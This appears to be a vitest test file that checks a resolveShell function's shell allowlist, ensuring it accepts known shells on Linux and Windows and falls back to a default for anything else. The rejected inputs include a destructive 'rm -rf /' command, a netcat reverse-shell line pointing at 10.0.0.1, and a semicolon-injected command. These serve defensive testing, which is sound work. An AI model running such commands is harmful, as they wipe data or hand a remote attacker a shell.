import { describe, it, expect } from 'vitest';
import { resolveShell } from '../src/terminals.js';

describe('resolveShell — shell allowlist (issue #5479)', () => {
  // Save and restore platform so tests are deterministic regardless of host OS.
  const originalPlatform = process.platform;

  function mockPlatform(platform: string) {
    Object.defineProperty(process, 'platform', { value: platform, configurable: true });
  }

  it('returns allowlisted posix shell when explicitly requested', () => {
    mockPlatform('linux');
    expect(resolveShell('/bin/zsh')).toBe('/bin/zsh');
    expect(resolveShell('/bin/bash')).toBe('/bin/bash');
    expect(resolveShell('/usr/bin/fish')).toBe('/usr/bin/fish');
    expect(resolveShell('/bin/dash')).toBe('/bin/dash');
  });

  it('drops a non-allowlisted shell and falls through to default', () => {
    mockPlatform('linux');
    delete process.env.SHELL;
    // Arbitrary executables must NOT be accepted
    expect(resolveShell('/usr/bin/python3')).toBe('/bin/bash');
    expect(resolveShell('/tmp/evil')).toBe('/bin/bash');
    expect(resolveShell('rm -rf /')).toBe('/bin/bash');
    expect(resolveShell('/bin/nc -e /bin/sh 10.0.0.1 4444')).toBe('/bin/bash');
  });

  it('respects SHELL env when no override is provided', () => {
    mockPlatform('linux');
    process.env.SHELL = '/bin/zsh';
    expect(resolveShell(null)).toBe('/bin/zsh');
    expect(resolveShell(undefined)).toBe('/bin/zsh');
    expect(resolveShell('')).toBe('/bin/zsh');
    delete process.env.SHELL;
  });

  it('trims whitespace before allowlist check', () => {
    mockPlatform('linux');
    expect(resolveShell('  /bin/bash  ')).toBe('/bin/bash');
    // Whitespace-padded arbitrary command still rejected
    expect(resolveShell('  /tmp/evil  ')).toBe('/bin/bash');
  });

  it('falls through when the allowlisted shell has trailing path traversal', () => {
    mockPlatform('linux');
    // Must NOT match via prefix or traversal
    expect(resolveShell('/bin/bash/../evil')).toBe('/bin/bash');
    expect(resolveShell('/bin/bash; rm -rf /')).toBe('/bin/bash');
  });

  it('win32: accepts allowlisted executable names (case-insensitive)', () => {
    mockPlatform('win32');
    expect(resolveShell('powershell.exe')).toBe('powershell.exe');
    expect(resolveShell('PowerShell.EXE')).toBe('PowerShell.EXE');
    expect(resolveShell('cmd.exe')).toBe('cmd.exe');
    expect(resolveShell('pwsh.exe')).toBe('pwsh.exe');
  });

  it('win32: rejects non-allowlisted executables', () => {
    mockPlatform('win32');
    delete process.env.ComSpec;
    // Arbitrary executables rejected
    expect(resolveShell('evil.exe')).toBe('powershell.exe');
    expect(resolveShell('nc.exe')).toBe('powershell.exe');
    expect(resolveShell('C:\\Windows\\System32\\calc.exe')).toBe('powershell.exe');
  });

  afterEach(() => {
    Object.defineProperty(process, 'platform', {
      value: originalPlatform,
      configurable: true,
    });
  });
});
